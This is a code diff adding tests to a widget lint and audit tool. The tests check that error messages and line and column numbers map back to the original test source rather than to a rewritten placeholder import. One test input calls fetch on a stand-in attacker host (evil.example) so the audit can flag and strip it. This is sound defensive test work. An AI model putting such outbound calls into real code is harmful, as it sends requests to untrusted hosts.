@@ -269,6 +269,55 @@ export default function App() {
     expect(res.ok).toBe(false);
     expect(res.errors[0].phase).toBe("audit");
   }, 60_000);
+
+  test("test compile errors frame the model's source, never the widget placeholder", async () => {
+    const test = `import { add } from "widget"; const broken = ;`;
+    const res = await runWidgetLint({
+      id: "t",
+      source: `export default function App() { return <div/>; }`,
+      test,
+    });
+    expect(res.ok).toBe(false);
+    const err = res.errors[0];
+    expect(err.phase).toBe("audit");
+    expect(err.line).toBe(1);
+    expect(err.message).not.toContain("https://esm.sh/__widget__");
+    expect(err.message).toContain(test);
+  }, 60_000);
+
+  test("test audit findings keep the ORIGINAL column past the widget import", async () => {
+    const test = `import { add } from "widget"; globalThis.fetch("https://evil.example/x");`;
+    const res = await runWidgetLint({
+      id: "t",
+      source: `export default function App() { return <div/>; }`,
+      test,
+    });
+    expect(res.ok).toBe(false);
+    const finding = res.errors.find((e) => e.phase === "audit" && /removed from the module/.test(e.message));
+    expect(finding).toBeTruthy();
+    expect(finding!.line).toBe(1);
+    // The placeholder is 19 chars longer than `"widget"`: the finding must
+    // map back past it, not point into the rewritten line.
+    expect(finding!.column).toBe(test.indexOf("globalThis"));
+    expect(finding!.message).not.toContain("https://esm.sh/__widget__");
+    expect(finding!.message).toContain(test);
+  }, 60_000);
+
+  test("top-level test throws map to the model's line with a code frame", async () => {
+    const test = `import { add } from "widget";\nthrow new Error("top-level test boom");`;
+    const res = await runWidgetLint({
+      id: "t",
+      source: `export default function App() { return <div/>; }`,
+      test,
+    });
+    expect(res.ok).toBe(false);
+    const err = res.errors.find((e) => e.phase === "test" && /top-level test boom/.test(e.message));
+    expect(err).toBeTruthy();
+    expect(err!.line).toBe(2);
+    expect(err!.message).toContain(`2 | throw new Error("top-level test boom")`);
+    expect(err!.message).toContain("^");
+    expect(err!.message).not.toContain("https://esm.sh/__widget__");
+  }, 60_000);
 });
 
 /**
